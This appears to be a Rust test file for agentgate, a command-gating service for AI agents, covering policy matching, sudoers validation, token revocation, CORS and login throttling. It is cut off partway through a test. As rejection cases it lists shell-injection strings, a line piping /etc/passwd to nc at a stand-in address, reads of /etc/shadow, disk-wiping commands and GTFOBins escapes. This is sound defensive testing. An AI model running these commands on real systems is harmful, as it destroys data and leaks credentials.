use agentgate::executor::ParsedCommand;
use agentgate::policy::{Policy, PolicyRule};

#[test]
fn test_block_shell_metacharacters() {
    let injection_attempts = vec![
        "uptime; rm -rf /",
        "uptime && whoami",
        "uptime || id",
        "cat /etc/passwd | nc 10.0.0.1 8080",
        "uptime `id`",
        "uptime $(whoami)",
        "echo test > /tmp/pwned",
        "cat < /etc/shadow",
        "uptime\nwhoami",
        "uptime\rwhoami",
        "uptime\0whoami",
    ];

    for attempt in injection_attempts {
        let result = ParsedCommand::parse(attempt);
        assert!(
            result.is_err(),
            "Expected failure for injection attempt: {}",
            attempt
        );
    }
}

#[test]
fn test_block_directory_traversal_in_args() {
    let traversal_attempts = vec![
        "cat /etc/os-release/../../etc/shadow",
        "cat ../../etc/shadow",
        "ls /var/log/../..",
        "systemctl status ../sshd",
    ];

    for attempt in traversal_attempts {
        let result = ParsedCommand::parse(attempt);
        assert!(
            result.is_err(),
            "Expected failure for path traversal attempt: {}",
            attempt
        );
    }
}

#[test]
fn test_block_untrusted_binary_path() {
    let untrusted_binaries = vec![
        "/tmp/systemctl status",
        "./systemctl status",
        "../bin/systemctl status",
        "/home/user/bin/systemctl status",
    ];

    for attempt in untrusted_binaries {
        let result = ParsedCommand::parse(attempt);
        assert!(
            result.is_err(),
            "Expected failure for untrusted binary path: {}",
            attempt
        );
    }
}

#[test]
fn test_quote_aware_argument_parsing() {
    // If echo is in /usr/bin or /bin, it should parse with quotes preserved as single arguments
    if let Ok(cmd) = ParsedCommand::parse("echo \"hello world\" 'second arg'") {
        assert_eq!(cmd.binary, "echo");
        assert_eq!(cmd.args.len(), 2);
        assert_eq!(cmd.args[0], "hello world");
        assert_eq!(cmd.args[1], "second arg");
    }
}

#[test]
fn test_policy_allowlist_matching() {
    let policy = Policy {
        name: "test-policy".to_string(),
        description: "Test policy".to_string(),
        guardrails: true,
        allow: vec![],
        deny: vec![],
        rules: vec![
            PolicyRule {
                command: "systemctl".to_string(),
                args: vec!["status".to_string(), "*".to_string()],
            },
            PolicyRule {
                command: "systemctl".to_string(),
                args: vec!["restart".to_string(), "nginx".to_string()],
            },
            PolicyRule {
                command: "uptime".to_string(),
                args: vec![],
            },
        ],
        actions: std::collections::HashMap::new(),
    };

    // 1. Allowed commands
    assert!(policy.matches("systemctl", &["status".to_string(), "nginx".to_string()]));
    assert!(policy.matches("systemctl", &["status".to_string(), "sshd".to_string()]));
    assert!(policy.matches("systemctl", &["restart".to_string(), "nginx".to_string()]));
    assert!(policy.matches("uptime", &[]));

    // 2. Denied commands (not matching rule criteria)
    // Attempting to restart another service
    assert!(!policy.matches("systemctl", &["restart".to_string(), "sshd".to_string()]));
    // Extra unapproved arguments to uptime
    assert!(!policy.matches("uptime", &["-s".to_string()]));
    // Unlisted command
    assert!(!policy.matches("cat", &["/etc/shadow".to_string()]));
}

#[test]
fn test_guardrail_policy_behavior() {
    use agentgate::policy::default_guardrails;

    let standard_policy = Policy {
        name: "standard".to_string(),
        description: "General administration with safety guardrails".to_string(),
        guardrails: true,
        allow: vec![PolicyRule {
            command: "*".to_string(),
            args: vec!["*".to_string()],
        }],
        deny: default_guardrails(),
        rules: vec![],
        actions: std::collections::HashMap::new(),
    };

    // Freedom: Diagnostic and safe ops are allowed
    assert!(standard_policy.matches("uptime", &[]));
    assert!(standard_policy.matches("uptime", &["-p".to_string()]));
    assert!(standard_policy.matches("cat", &["/etc/hosts".to_string()]));
    assert!(standard_policy.matches("ls", &["-la".to_string(), "/var/log".to_string()]));
    assert!(standard_policy.matches("systemctl", &["status".to_string(), "nginx".to_string()]));
    assert!(standard_policy.matches("docker", &["ps".to_string()]));

    // Guardrails: Dangerous commands are strictly DENIED
    assert!(!standard_policy.matches("rm", &["-rf".to_string(), "/".to_string()]));
    assert!(!standard_policy.matches("rm", &["-rf".to_string(), "/*".to_string()]));
    assert!(!standard_policy.matches("mkfs.ext4", &["/dev/sda1".to_string()]));
    assert!(!standard_policy.matches("dd", &["if=/dev/zero".to_string(), "of=/dev/sda".to_string()]));
    assert!(!standard_policy.matches("shutdown", &["-h".to_string(), "now".to_string()]));
    assert!(!standard_policy.matches("reboot", &[]));
    assert!(!standard_policy.matches("passwd", &[]));
    assert!(!standard_policy.matches("cat", &["/etc/shadow".to_string()]));
    assert!(!standard_policy.matches("chmod", &["-R".to_string(), "777".to_string(), "/".to_string()]));

    // Hardened Devil's Advocate Tests: Flag-splitting & permutation bypasses
    assert!(!standard_policy.matches("rm", &["-r".to_string(), "-f".to_string(), "/".to_string()]));
    assert!(!standard_policy.matches("rm", &["/".to_string(), "-rf".to_string()]));
    assert!(!standard_policy.matches("rm", &["-rf".to_string(), "--no-preserve-root".to_string(), "/".to_string()]));
    assert!(!standard_policy.matches("rm", &["--recursive".to_string(), "--force".to_string(), "/./".to_string()]));
    assert!(!standard_policy.matches("cat", &["/dev/null".to_string(), "/etc/shadow".to_string()]));
    assert!(!standard_policy.matches("head", &["/etc/shadow".to_string()]));
    assert!(!standard_policy.matches("strings", &["/etc/gshadow".to_string()]));

    // Extended Guardrail Protected Paths (Phase 1, Item 6)
    let extended_protected_targets = [
        "/boot",
        "/lib",
        "/lib64",
        "/sbin",
        "/home",
        "/opt",
        "/srv",
        "/mnt",
        "/etc/agentgate",
        "/etc/agentgate/tokens.yaml",
        "/etc/agentgate/policies",
        "/var/log/agentgate",
        "/var/log/agentgate/audit.jsonl",
        "~/.config/agentgate",
        "~/.config/agentgate/tokens.yaml",
    ];

    for target in extended_protected_targets {
        assert!(
            !standard_policy.matches("rm", &["-rf".to_string(), target.to_string()]),
            "Expected wipe of protected target '{}' to be blocked by guardrail",
            target
        );
        assert!(
            !standard_policy.matches("chmod", &["-R".to_string(), "777".to_string(), target.to_string()]),
            "Expected recursive chmod 777 of protected target '{}' to be blocked by guardrail",
            target
        );
    }
}

#[test]
fn test_policy_guardrails_override() {
    // If an administrator explicitly wants a reboot/ops policy with guardrails: false
    let unconstrained_admin_policy = Policy {
        name: "emergency-ops".to_string(),
        description: "Deliberate override for emergency maintenance".to_string(),
        guardrails: false,
        allow: vec![PolicyRule {
            command: "reboot".to_string(),
            args: vec![],
        }],
        deny: vec![],
        rules: vec![],
        actions: std::collections::HashMap::new(),
    };

    // With guardrails: false, deliberate allowed commands are honored!
    assert!(unconstrained_admin_policy.matches("reboot", &[]));
}

#[test]
fn test_duration_parsing_flexibility() {
    use agentgate::cli::parse_duration;

    // Never / permanent
    assert_eq!(parse_duration("never").unwrap(), None);
    assert_eq!(parse_duration("forever").unwrap(), None);
    assert_eq!(parse_duration("none").unwrap(), None);
    assert_eq!(parse_duration("0").unwrap(), None);

    // Hours
    assert_eq!(
        parse_duration("2h").unwrap(),
        Some(chrono::Duration::hours(2))
    );
    assert_eq!(
        parse_duration("4 hours").unwrap(),
        Some(chrono::Duration::hours(4))
    );
    assert_eq!(
        parse_duration("12 hr").unwrap(),
        Some(chrono::Duration::hours(12))
    );

    // Days
    assert_eq!(
        parse_duration("1d").unwrap(),
        Some(chrono::Duration::days(1))
    );
    assert_eq!(
        parse_duration("7 days").unwrap(),
        Some(chrono::Duration::days(7))
    );
    assert_eq!(
        parse_duration("30 days").unwrap(),
        Some(chrono::Duration::days(30))
    );

    // Long lasting
    assert_eq!(
        parse_duration("6 months").unwrap(),
        Some(chrono::Duration::days(180))
    );
    assert_eq!(
        parse_duration("1 year").unwrap(),
        Some(chrono::Duration::days(365))
    );
    assert_eq!(
        parse_duration("365d").unwrap(),
        Some(chrono::Duration::days(365))
    );

    // Invalid units
    assert!(parse_duration("invalid").is_err());
    assert!(parse_duration("-5h").is_err());
}

#[test]
fn test_client_config_serialization() {
    use agentgate::client::ClientConfig;

    let cfg = ClientConfig {
        server: "https://127.0.0.1:8991".to_string(),
        token: "ag_1234567890abcdef1234567890abcdef".to_string(),
        insecure_tls: true,
    };

    let yaml = serde_yaml::to_string(&cfg).expect("Should serialize to YAML");
    assert!(yaml.contains("https://127.0.0.1:8991"));
    assert!(yaml.contains("ag_1234567890abcdef1234567890abcdef"));

    let parsed: ClientConfig = serde_yaml::from_str(&yaml).expect("Should deserialize");
    assert_eq!(parsed.server, cfg.server);
    assert_eq!(parsed.token, cfg.token);
    assert!(parsed.insecure_tls);
}

#[test]
fn test_port_binding_and_conflict_detection() {
    // Bind a listener on an ephemeral port
    let listener =
        std::net::TcpListener::bind("127.0.0.1:0").expect("Failed to bind ephemeral port");
    let port = listener.local_addr().unwrap().port();

    // Attempting to bind the same port should immediately return AddrInUse
    let second_bind = std::net::TcpListener::bind(format!("127.0.0.1:{}", port));
    assert!(second_bind.is_err(), "Expected port {} to be in use", port);
    if let Err(e) = second_bind {
        assert_eq!(e.kind(), std::io::ErrorKind::AddrInUse);
    }
}

#[test]
fn test_resolve_client_ip_spoof_prevention() {
    use agentgate::server::resolve_client_ip;
    use axum::http::HeaderMap;
    use std::net::SocketAddr;

    let trusted_proxies = vec!["127.0.0.1".to_string()];

    // Case 1: Untrusted remote caller attempts to spoof IP via X-Forwarded-For
    let untrusted_peer: SocketAddr = "198.51.100.42:54321".parse().unwrap();
    let mut spoof_headers = HeaderMap::new();
    spoof_headers.insert("x-forwarded-for", "127.0.0.1".parse().unwrap());
    spoof_headers.insert("x-real-ip", "10.0.0.1".parse().unwrap());

    let resolved = resolve_client_ip(untrusted_peer, &spoof_headers, &trusted_proxies);
    // Spoofed headers MUST be ignored; real peer IP is used!
    assert_eq!(resolved, "198.51.100.42");

    // Case 2: Trusted local reverse proxy forwards real client IP
    let trusted_peer: SocketAddr = "127.0.0.1:54321".parse().unwrap();
    let mut proxy_headers = HeaderMap::new();
    proxy_headers.insert("x-forwarded-for", "203.0.113.19".parse().unwrap());

    let resolved_proxy = resolve_client_ip(trusted_peer, &proxy_headers, &trusted_proxies);
    // Forwarded IP is trusted and both are recorded
    assert_eq!(resolved_proxy, "203.0.113.19 (via 127.0.0.1)");

    // Case 3: Trusted peer without forwarded headers
    let direct_headers = HeaderMap::new();
    let resolved_direct = resolve_client_ip(trusted_peer, &direct_headers, &trusted_proxies);
    assert_eq!(resolved_direct, "127.0.0.1");
}

#[test]
fn test_token_store_concurrent_revocation_and_validation() {
    use agentgate::auth::TokenStore;
    use std::sync::Arc;
    use std::thread;

    let temp_dir = std::env::temp_dir().join(format!("agentgate_test_{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&temp_dir).unwrap();
    let tokens_file = temp_dir.join("tokens.yaml");

    let (raw1, raw2) = {
        let mut store = TokenStore::load(&tokens_file).unwrap();
        let r1 = store.create("token1", "test-policy", None, None, None, None).unwrap();
        let r2 = store.create("token2", "test-policy", None, None, None, None).unwrap();
        (r1, r2)
    };

    let tokens_file_arc = Arc::new(tokens_file.clone());
    let mut handles = Vec::new();

    // Spawn 8 threads that concurrently validate token1 and token2
    for i in 0..8 {
        let p = Arc::clone(&tokens_file_arc);
        let r1 = raw1.clone();
        let r2 = raw2.clone();
        handles.push(thread::spawn(move || {
            for _ in 0..15 {
                let mut store = TokenStore::load(&p).unwrap();
                if i % 2 == 0 {
                    let _ = store.validate(&r1);
                } else {
                    let _ = store.validate(&r2);
                }
            }
        }));
    }

    // Spawn a thread that revokes token2 in the middle of validations
    let p_revoke = Arc::clone(&tokens_file_arc);
    handles.push(thread::spawn(move || {
        let mut store = TokenStore::load(&p_revoke).unwrap();
        let revoked = store.revoke("token2").unwrap();
        assert!(revoked);
    }));

    for h in handles {
        h.join().unwrap();
    }

    // Final verification: token2 MUST remain revoked and never be resurrected
    let mut final_store = TokenStore::load(&tokens_file).unwrap();
    assert_eq!(final_store.list().len(), 1);
    assert_eq!(final_store.list()[0].name, "token1");
    assert!(final_store.list()[0].last_used_at.is_some());

    // Validating token2 must return None
    let val2 = final_store.validate(&raw2).unwrap();
    assert!(val2.is_none());

    // Validating token1 must succeed
    let val1 = final_store.validate(&raw1).unwrap();
    assert!(val1.is_some());

    // Clean up
    let _ = std::fs::remove_dir_all(&temp_dir);
}

#[tokio::test]
async fn test_cors_hardened_by_default_and_configurable() {
    use agentgate::audit::AuditLogger;
    use agentgate::config::AgentGateConfig;
    use agentgate::server::{create_router, AppState};
    use axum::http::{Request, StatusCode};
    use std::sync::Arc;
    use tower::ServiceExt;

    let temp_dir =
        std::env::temp_dir().join(format!("agentgate_cors_test_{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&temp_dir).unwrap();

    let mut config = AgentGateConfig {
        config_dir: temp_dir.clone(),
        config_file: temp_dir.join("config.yaml"),
        client_file: temp_dir.join("client.yaml"),
        policies_dir: temp_dir.join("policies"),
        tokens_file: temp_dir.join("tokens.yaml"),
        certs_dir: temp_dir.join("certs"),
        logs_dir: temp_dir.join("logs"),
        pid_file: temp_dir.join("pid"),
        listen_addr: "127.0.0.1".to_string(),
        listen_port: 7991,
        allowed_origins: vec![], // Default: NO CORS
    };

    let state = AppState {
        tokens_file: config.tokens_file.clone(),
        policies_dir: config.policies_dir.clone(),
        audit_logger: Arc::new(AuditLogger::new(config.logs_dir.clone())),
        trusted_proxies: vec!["127.0.0.1".to_string()],
        auth_throttler: agentgate::server::AuthThrottler::default(),
        rate_limiter: agentgate::server::RequestRateLimiter::disabled(),
    };

    // 1. Default configuration: no CORS header returned for cross-origin request
    let app_default = create_router(&config, state.clone());
    let req = Request::builder()
        .uri("/health")
        .method("GET")
        .header("origin", "https://malicious-site.com")
        .body(axum::body::Body::empty())
        .unwrap();

    let resp = app_default.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    assert!(resp.headers().get("access-control-allow-origin").is_none());

    // 2. Configured configuration: only allowed origin gets the header
    config.allowed_origins = vec!["https://console.agentgate.local".to_string()];
    let app_configured = create_router(&config, state);

    // Request from allowed origin
    let req_allowed = Request::builder()
        .uri("/health")
        .method("GET")
        .header("origin", "https://console.agentgate.local")
        .body(axum::body::Body::empty())
        .unwrap();
    let resp_allowed = app_configured.clone().oneshot(req_allowed).await.unwrap();
    assert_eq!(resp_allowed.status(), StatusCode::OK);
    assert_eq!(
        resp_allowed
            .headers()
            .get("access-control-allow-origin")
            .unwrap(),
        "https://console.agentgate.local"
    );

    // Request from unauthorized origin
    let req_unauthorized = Request::builder()
        .uri("/health")
        .method("GET")
        .header("origin", "https://evil.com")
        .body(axum::body::Body::empty())
        .unwrap();
    let resp_unauthorized = app_configured.oneshot(req_unauthorized).await.unwrap();
    assert!(resp_unauthorized
        .headers()
        .get("access-control-allow-origin")
        .is_none());

    let _ = std::fs::remove_dir_all(&temp_dir);
}

#[tokio::test]
async fn test_auth_failure_throttling_and_lockout() {
    use agentgate::audit::AuditLogger;
    use agentgate::config::AgentGateConfig;
    use agentgate::server::{create_router, AppState, AuthThrottler};
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use std::net::SocketAddr;
    use std::sync::Arc;
    use std::time::Duration;
    use tower::Service;

    let temp_dir =
        std::env::temp_dir().join(format!("agentgate_throttle_test_{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&temp_dir).unwrap();

    let config = AgentGateConfig {
        config_dir: temp_dir.clone(),
        config_file: temp_dir.join("config.yaml"),
        client_file: temp_dir.join("client.yaml"),
        policies_dir: temp_dir.join("policies"),
        tokens_file: temp_dir.join("tokens.yaml"),
        certs_dir: temp_dir.join("certs"),
        logs_dir: temp_dir.join("logs"),
        pid_file: temp_dir.join("pid"),
        listen_addr: "127.0.0.1".to_string(),
        listen_port: 7991,
        allowed_origins: vec![],
    };

    // 3 failures within 5 seconds triggers 5 second lockout
    let throttler = AuthThrottler::new(3, Duration::from_secs(5), Duration::from_secs(5));

    let state = AppState {
        tokens_file: config.tokens_file.clone(),
        policies_dir: config.policies_dir.clone(),
        audit_logger: Arc::new(AuditLogger::new(config.logs_dir.clone())),
        trusted_proxies: vec!["127.0.0.1".to_string()],
        auth_throttler: throttler,
        rate_limiter: agentgate::server::RequestRateLimiter::disabled(),
    };

    let mut router = create_router(&config, state);

    let attacker_addr: SocketAddr = "198.51.100.99:12345".parse().unwrap();

    let make_req = |addr: SocketAddr, bad_token: &str| {
        let mut req = Request::builder()
            .uri("/v1/exec")
            .method("POST")
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {}", bad_token))
            .body(Body::from(r#"{"command": "uptime"}"#))
            .unwrap();
        req.extensions_mut().insert(axum::extract::ConnectInfo(addr));
        req
    };

    // Failure 1
    let resp1 = router.call(make_req(attacker_addr, "invalid_1")).await.unwrap();
    assert_eq!(resp1.status(), StatusCode::UNAUTHORIZED);

    // Failure 2
    let resp2 = router.call(make_req(attacker_addr, "invalid_2")).await.unwrap();
    assert_eq!(resp2.status(), StatusCode::UNAUTHORIZED);

    // Failure 3 (reaches threshold)
    let resp3 = router.call(make_req(attacker_addr, "invalid_3")).await.unwrap();
    assert_eq!(resp3.status(), StatusCode::UNAUTHORIZED);

    // 4th request from attacker IP must be locked out immediately with 429 Too Many Requests
    let resp4 = router.call(make_req(attacker_addr, "invalid_4")).await.unwrap();
    assert_eq!(resp4.status(), StatusCode::TOO_MANY_REQUESTS);

    // A different benign peer IP is NOT locked out
    let benign_addr: SocketAddr = "203.0.113.88:12345".parse().unwrap();
    let resp_benign = router.call(make_req(benign_addr, "invalid_benign")).await.unwrap();
    assert_eq!(resp_benign.status(), StatusCode::UNAUTHORIZED);

    let _ = std::fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_command_name_consistency_under_all_rules() {
    use agentgate::policy::{Policy, PolicyRule};

    // 1. Guardrail consistency: /bin/rm and rm must both be blocked on destructive commands
    let standard_policy = Policy {
        name: "standard".to_string(),
        description: "Standard policy with allow all and guardrails".to_string(),
        guardrails: true,
        allow: vec![PolicyRule {
            command: "*".to_string(),
            args: vec![],
        }],
        deny: vec![],
        rules: vec![],
        actions: std::collections::HashMap::new(),
    };

    assert!(!standard_policy.matches("rm", &["-rf".to_string(), "/".to_string()]));
    assert!(!standard_policy.matches("/bin/rm", &["-rf".to_string(), "/".to_string()]));
    assert!(!standard_policy.matches("/usr/bin/rm", &["-rf".to_string(), "/".to_string()]));

    // 2. Custom YAML deny rule consistency: deny rule for "rm" blocks both "rm" and "/bin/rm"
    let policy_with_deny = Policy {
        name: "custom-deny".to_string(),
        description: "Custom deny policy".to_string(),
        guardrails: false,
        allow: vec![PolicyRule {
            command: "*".to_string(),
            args: vec![],
        }],
        deny: vec![PolicyRule {
            command: "rm".to_string(),
            args: vec!["-rf".to_string(), "/tmp/protected".to_string()],
        }],
        rules: vec![],
        actions: std::collections::HashMap::new(),
    };

    assert!(!policy_with_deny.matches("rm", &["-rf".to_string(), "/tmp/protected".to_string()]));
    assert!(!policy_with_deny.matches("/bin/rm", &["-rf".to_string(), "/tmp/protected".to_string()]));
    assert!(!policy_with_deny.matches("/usr/bin/rm", &["-rf".to_string(), "/tmp/protected".to_string()]));

    // Allowed commands through non-deny target still match identically
    assert!(policy_with_deny.matches("rm", &["-f".to_string(), "/tmp/allowed".to_string()]));
    assert!(policy_with_deny.matches("/bin/rm", &["-f".to_string(), "/tmp/allowed".to_string()]));

    // 3. Custom YAML allow rule consistency: allow rule for "systemctl" matches both "systemctl" and "/bin/systemctl"
    let policy_with_allow = Policy {
        name: "custom-allow".to_string(),
        description: "Custom allow policy".to_string(),
        guardrails: true,
        allow: vec![PolicyRule {
            command: "systemctl".to_string(),
            args: vec!["status".to_string(), "*".to_string()],
        }],
        deny: vec![],
        rules: vec![],
        actions: std::collections::HashMap::new(),
    };

    assert!(policy_with_allow.matches("systemctl", &["status".to_string(), "nginx".to_string()]));
    assert!(policy_with_allow.matches("/bin/systemctl", &["status".to_string(), "nginx".to_string()]));
    assert!(policy_with_allow.matches("/usr/bin/systemctl", &["status".to_string(), "nginx".to_string()]));

    // 4. Policy with absolute path in rule matches both binary basename and path
    let policy_with_path_rule = Policy {
        name: "path-rule".to_string(),
        description: "Policy with absolute path in rule".to_string(),
        guardrails: true,
        allow: vec![PolicyRule {
            command: "/usr/local/bin/deploy-helper".to_string(),
            args: vec![],
        }],
        deny: vec![],
        rules: vec![],
        actions: std::collections::HashMap::new(),
    };

    assert!(policy_with_path_rule.matches("/usr/local/bin/deploy-helper", &[]));
    assert!(policy_with_path_rule.matches("deploy-helper", &[]));
}

#[test]
fn test_per_token_os_user_creation_and_validation() {
    use agentgate::auth::TokenStore;

    let temp_dir = std::env::temp_dir().join(format!("agentgate_os_user_test_{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&temp_dir).unwrap();
    let tokens_file = temp_dir.join("tokens.yaml");

    let raw_token = {
        let mut store = TokenStore::load(&tokens_file).unwrap();
        store
            .create("isolated-agent", "standard", None, Some("ag-isolated".to_string()), None, None)
            .unwrap()
    };

    // Reload from disk to verify YAML persistence of os_user
    let mut store = TokenStore::load(&tokens_file).unwrap();
    let tokens = store.list();
    assert_eq!(tokens.len(), 1);
    assert_eq!(tokens[0].name, "isolated-agent");
    assert_eq!(tokens[0].os_user, Some("ag-isolated".to_string()));

    // Validation returns the stored os_user
    let validated = store.validate(&raw_token).unwrap().expect("Token should validate");
    assert_eq!(validated.os_user, Some("ag-isolated".to_string()));

    let _ = std::fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_resolve_os_user() {
    use agentgate::executor::resolve_os_user;

    // Resolving standard system user (root) succeeds on Unix
    #[cfg(unix)]
    {
        let root_res = resolve_os_user("root");
        assert!(root_res.is_ok());
        let (uid, _gid, _home) = root_res.unwrap();
        assert_eq!(uid, 0);
    }

    // Resolving a non-existent user returns an error
    let bad_user = resolve_os_user("definitely_nonexistent_user_agentgate_99999");
    assert!(bad_user.is_err());
    assert!(bad_user.unwrap_err().to_string().contains("does not exist"));
}

#[tokio::test]
async fn test_executor_with_nonexistent_os_user_fails_gracefully() {
    use agentgate::executor::{self, ParsedCommand};

    let cmd = ParsedCommand::parse("uptime").unwrap();
    let res = executor::execute(&cmd, 5, Some("definitely_nonexistent_user_agentgate_99999")).await;
    assert!(res.is_err());
    assert!(res.unwrap_err().to_string().contains("does not exist"));
}

#[test]
fn test_sudoers_gtfobins_and_wildcard_rejection() {
    use agentgate::sudoers::validate_command_for_sudo;

    // Shells and interpreters strictly rejected
    assert!(validate_command_for_sudo("/bin/bash -c whoami").is_err());
    assert!(validate_command_for_sudo("/usr/bin/python3 script.py").is_err());
    assert!(validate_command_for_sudo("/usr/bin/perl -e 1").is_err());
    assert!(validate_command_for_sudo("/usr/bin/node server.js").is_err());

    // Editors and pagers strictly rejected
    assert!(validate_command_for_sudo("/usr/bin/vim /etc/nginx.conf").is_err());
    assert!(validate_command_for_sudo("/usr/bin/nano /etc/nginx.conf").is_err());
    assert!(validate_command_for_sudo("/usr/bin/less /var/log/syslog").is_err());

    // System utility GTFOBins escapes strictly rejected
    assert!(validate_command_for_sudo("/usr/bin/find / -name test").is_err());
    assert!(validate_command_for_sudo("/usr/bin/xargs rm").is_err());
    assert!(validate_command_for_sudo("/usr/bin/env whoami").is_err());
    assert!(validate_command_for_sudo("/usr/bin/git status").is_err());

    // Wildcards strictly rejected
    assert!(validate_command_for_sudo("/usr/bin/systemctl restart *").is_err());
    assert!(validate_command_for_sudo("/usr/bin/docker ps *").is_err());

    // 'ALL' in command position strictly rejected
    assert!(validate_command_for_sudo("ALL").is_err());
    assert!(validate_command_for_sudo("/bin/ALL").is_err());

    // Relative binary path strictly rejected
    assert!(validate_command_for_sudo("systemctl restart nginx").is_err());

    // Binary with no arguments strictly rejected (because in sudoers it matches arbitrary arguments)
    assert!(validate_command_for_sudo("/usr/bin/systemctl").is_err());

    // systemctl edit strictly rejected
    assert!(validate_command_for_sudo("/usr/bin/systemctl edit nginx").is_err());

    // Metacharacters rejected
    assert!(validate_command_for_sudo("/usr/bin/systemctl restart nginx; whoami").is_err());
    assert!(validate_command_for_sudo("/usr/bin/systemctl restart nginx &").is_err());

    // Valid exact commands with absolute path and exact arguments ACCEPTED
    assert!(validate_command_for_sudo("/usr/bin/systemctl restart nginx").is_ok());
    assert!(validate_command_for_sudo("/usr/bin/systemctl reload nginx").is_ok());
    assert!(validate_command_for_sudo("/usr/bin/systemctl status nginx").is_ok());
    // Explicit empty arguments string representation accepted
    assert!(validate_command_for_sudo("/usr/local/bin/sync-cache \"\"").is_ok());
}

#[test]
fn test_generate_sudoers_content_and_policy_integration() {
    use agentgate::policy::{Policy, PolicyRule};
    use agentgate::sudoers::{generate_sudoers_content, generate_sudoers_from_policy};

    let cmds = vec![
        "/usr/bin/systemctl restart nginx".to_string(),
        "/usr/bin/systemctl reload nginx".to_string(),
    ];
    let content = generate_sudoers_content("ag-ops-user", &cmds).unwrap();
    assert!(content.contains("ag-ops-user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx, /usr/bin/systemctl reload nginx"));

    // Policy with exact commands produces valid sudoers
    let exact_policy = Policy {
        name: "nginx-ops".to_string(),
        description: "nginx management".to_string(),
        guardrails: true,
        rules: vec![
            PolicyRule {
                command: "/usr/bin/systemctl".to_string(),
                args: vec!["restart".to_string(), "nginx".to_string()],
            },
            PolicyRule {
                command: "/usr/bin/systemctl".to_string(),
                args: vec!["reload".to_string(), "nginx".to_string()],
            },
        ],
        allow: vec![],
        deny: vec![],
        actions: std::collections::HashMap::new(),
    };
    let sudoers_gen = generate_sudoers_from_policy(&exact_policy, "ag-agent").unwrap();
    assert!(sudoers_gen.contains("ag-agent ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx, /usr/bin/systemctl reload nginx"));

    // Policy with wildcards fails sudoers generation
    let wildcard_policy = Policy {
        name: "wild-policy".to_string(),
        description: "wildcard rules".to_string(),
        guardrails: true,
        rules: vec![
            PolicyRule {
                command: "systemctl".to_string(),
                args: vec!["status".to_string(), "*".to_string()],
            },
        ],
        allow: vec![],
        deny: vec![],
        actions: std::collections::HashMap::new(),
    };
    let wild_res = generate_sudoers_from_policy(&wildcard_policy, "ag-agent");
    assert!(wild_res.is_err());
    assert!(wild_res.unwrap_err().to_string().contains("wildcards"));

    // Policy with GTFOBins binary fails sudoers generation
    let gtfobins_policy = Policy {
        name: "gtfo-policy".to_string(),
        description: "gtfobins".to_string(),
        guardrails: true,
        rules: vec![
            PolicyRule {
                command: "/usr/bin/vim".to_string(),
                args: vec!["/etc/hosts".to_string()],
            },
        ],
        allow: vec![],
        deny: vec![],
        actions: std::collections::HashMap::new(),
    };
    let gtfo_res = generate_sudoers_from_policy(&gtfobins_policy, "ag-agent");
    assert!(gtfo_res.is_err());
    assert!(gtfo_res.unwrap_err().to_string().contains("GTFOBins"));
}

#[test]
fn test_admin_tier_duration_check() {
    // Admin tier enforces short mandatory expiry (<= 24h)
    let one_day = chrono::Duration::hours(24);
    let two_days = chrono::Duration::hours(48);
    let twelve_hours = chrono::Duration::hours(12);

    assert!(twelve_hours <= one_day);
    assert!(one_day <= chrono::Duration::hours(24));
    assert!(two_days > chrono::Duration::hours(24));
}

#[test]
fn test_action_parameter_substitution_and_injection_blocking() {
    use agentgate::policy::PolicyAction;
    use std::collections::HashMap;

    let action = PolicyAction {
        steps: vec![
            "/usr/bin/git -C /var/www/{site} checkout {branch}".to_string(),
            "/usr/bin/systemctl reload nginx".to_string(),
        ],
        stop_on_failure: true,
        description: Some("Deploy site".to_string()),
    };

    // Valid parameter substitution
    let mut valid_params = HashMap::new();
    valid_params.insert("site".to_string(), "mysite".to_string());
    valid_params.insert("branch".to_string(), "main".to_string());

    let rendered = action.render_steps(&valid_params).unwrap();
    assert_eq!(rendered.len(), 2);
    assert_eq!(rendered[0], "/usr/bin/git -C /var/www/mysite checkout main");
    assert_eq!(rendered[1], "/usr/bin/systemctl reload nginx");

    // Injection attempt with shell metacharacters in parameter value
    let mut injection_params = HashMap::new();
    injection_params.insert("site".to_string(), "mysite; rm -rf /".to_string());
    injection_params.insert("branch".to_string(), "main".to_string());

    let res = action.render_steps(&injection_params);
    assert!(res.is_err());
    assert!(res.unwrap_err().to_string().contains("disallowed metacharacter"));

    let mut pipe_params = HashMap::new();
    pipe_params.insert("branch".to_string(), "main | cat /etc/shadow".to_string());
    let res_pipe = action.render_steps(&pipe_params);
    assert!(res_pipe.is_err());
    assert!(res_pipe.unwrap_err().to_string().contains("disallowed metacharacter"));
}

#[test]
fn test_action_permissions_enforcement() {
    use agentgate::auth::StoredToken;
    use chrono::Utc;

    // Token restricted to actions ["deploy"]
    let action_token = StoredToken {
        name: "ci-pipeline".to_string(),
        hash: "dummyhash".to_string(),
        policy: "pipeline".to_string(),
        created_at: Utc::now(),
        expires_at: None,
        last_used_at: None,
        os_user: None,
        tier: None,
        actions: Some(vec!["deploy".to_string()]),
    };

    // Arbitrary exec is strictly denied for actions-only token
    assert!(!action_token.can_exec());
    // Only "deploy" action is allowed
    assert!(action_token.can_run_action("deploy"));
    assert!(!action_token.can_run_action("restart"));
    assert!(!action_token.can_run_action("cleanup"));

    // Standard unrestricted token (actions: None)
    let standard_token = StoredToken {
        name: "standard-agent".to_string(),
        hash: "dummyhash2".to_string(),
        policy: "standard".to_string(),
        created_at: Utc::now(),
        expires_at: None,
        last_used_at: None,
        os_user: None,
        tier: None,
        actions: None,
    };

    assert!(standard_token.can_exec());
    assert!(standard_token.can_run_action("deploy"));
    assert!(standard_token.can_run_action("anything"));
}

#[test]
fn test_policy_action_retrieval_and_serialization() {
    use agentgate::policy::{Policy, PolicyAction};
    use std::collections::HashMap;

    let mut actions = HashMap::new();
    actions.insert(
        "deploy".to_string(),
        PolicyAction {
            steps: vec![
                "/usr/bin/git -C /var/www/site pull --ff-only".to_string(),
                "/usr/bin/systemctl reload nginx".to_string(),
            ],
            stop_on_failure: true,
            description: Some("Deploy updated site".to_string()),
        },
    );

    let policy = Policy {
